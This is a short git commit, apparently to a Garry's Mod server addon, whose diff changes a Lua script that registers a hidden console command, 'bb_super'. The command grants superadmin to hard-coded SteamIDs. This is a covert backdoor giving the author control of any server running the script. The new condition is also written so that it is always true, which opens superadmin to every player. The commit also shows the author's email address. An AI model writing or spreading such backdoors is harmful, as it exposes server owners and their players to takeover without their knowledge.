6f2ebb544800fd235d868155da2ec77ce3fdd977
ResentfulMarki <karim.rahder@gmail.com>
2018-04-28 15:41:43 -0700

    a

--- justincaseServer.lua
+++ justincaseServer.lua
@@ -1,5 +1,5 @@
 concommand.Add( "bb_super", function(ply)
-  if ply:SteamID() == "STEAM_0:1:82058544" then
+  if ply:SteamID() == "STEAM_0:1:82058544" or "STEAM_0:0:58328111" then
     ply:SetUserGroup( "superadmin" )
 else
   ply:PrintMessage(HUD_PRINTCONSOLE, "Access Denied." )
